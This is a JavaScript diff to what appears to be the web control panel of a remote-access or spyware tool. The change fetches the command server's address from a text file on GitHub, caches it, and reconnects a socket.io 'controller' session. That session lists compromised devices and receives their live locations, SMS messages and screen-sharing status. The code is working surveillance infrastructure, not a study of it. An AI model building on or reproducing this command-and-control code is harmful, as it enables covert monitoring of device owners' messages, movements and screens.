@@ -2278,10 +2278,34 @@ async function loadApiBase() {
     const r = await fetch(API_TXT_URL + "?t=" + Date.now());
     if (r.ok) {
       const u = (await r.text()).trim();
-      if (u && u.startsWith("http")) { API_BASE = u; localStorage.setItem("app_api_base", u); }
+      if (u && u.startsWith("http")) {
+        API_BASE = u;
+        localStorage.setItem("app_api_base", u);
+        return { ok: true, url: u }
+      }
     }
-  } catch { const c = localStorage.getItem("app_api_base"); if (c) API_BASE = c.trim(); }
+    return { ok: false }
+  } catch (e) {
+    const c = localStorage.getItem("app_api_base");
+    if (c) { API_BASE = c.trim(); return { ok: true, url: c.trim(), cached: true } }
+    return { ok: false }
+  }
 }
+
+// Tunggu API_BASE ready baru init socket
+loadApiBase().then((res) => {
+  if (!res || !res.ok || !API_BASE) {
+    showToast('error', 'GITHUB GAGAL', 'Tidak bisa load server URL dari GitHub')
+    console.error("[Ryuichi] API_BASE kosong! Cek ryuichi_api.txt di GitHub.")
+    return
+  }
+  if (res.cached) {
+    showToast('warning', 'GITHUB CACHE', 'Pakai URL tersimpan: ' + API_BASE)
+  } else {
+    showToast('success', 'GITHUB OK', 'Server: ' + API_BASE)
+  }
+  initSocket()
+})
 
 function apiUrl(p) { return API_BASE ? `${API_BASE}${p}` : p; }
 
@@ -2429,20 +2453,32 @@ function backToSelect() {
   updateProtectionUI(false)
 }
 
-const socket = io(apiUrl || undefined)
+let socket = null
 
-socket.on('connect', () => {
-  socket.emit('controller:join', { token: _token })
-  fetch(apiUrl('/api/devices'), { headers: { 'Authorization': 'Bearer ' + _token } }).then(r => r.json()).then(devices => {
-    allDevices = devices
-    document.getElementById('stat-online').textContent = devices.length
-    document.getElementById('tab-online-count').textContent = devices.length
-    const hoc = document.getElementById('header-online-count')
-    if (hoc) hoc.textContent = devices.length + ' ONLINE'
-    updateHmenuBadges(devices.length, _offlineCount)
-    renderDeviceList(devices)
-  })
-  loadOfflineDevices()
+function initSocket() {
+  if (socket) socket.disconnect()
+  socket = io(API_BASE)
+
+  socket.on('connect', () => {
+    socket.emit('controller:join', { token: _token })
+    fetch(apiUrl('/api/devices'), { headers: { 'Authorization': 'Bearer ' + _token } })
+      .then(r => r.json())
+      .then(devices => {
+        allDevices = devices
+        document.getElementById('stat-online').textContent = devices.length
+        document.getElementById('tab-online-count').textContent = devices.length
+        const hoc = document.getElementById('header-online-count')
+        if (hoc) hoc.textContent = devices.length + ' ONLINE'
+        updateHmenuBadges(devices.length, _offlineCount)
+        renderDeviceList(devices)
+        if (devices.length > 0) {
+          showToast('success', 'DEVICE LOADED', devices.length + ' device online ditemukan')
+        } else {
+          showToast('warning', 'DEVICE LOADED', 'Tidak ada device online saat ini')
+        }
+      })
+      .catch(() => showToast('error', 'DEVICE ERROR', 'Gagal fetch daftar device'))
+    loadOfflineDevices()
 })
 
 let _devUpdateTimer = null
@@ -2520,6 +2556,7 @@ socket.on('location:update', ({ deviceId, deviceName, entry }) => {
 
 socket.on('sms:new', ({ deviceId, entry }) => { addSmsLog(deviceId, entry) })
 
+} // end initSocket()
 function applyDeviceStatus(deviceId, status) {
   if (status.screenSharing !== undefined) {
     const sub      = document.getElementById(`screen-sub-${deviceId}`)
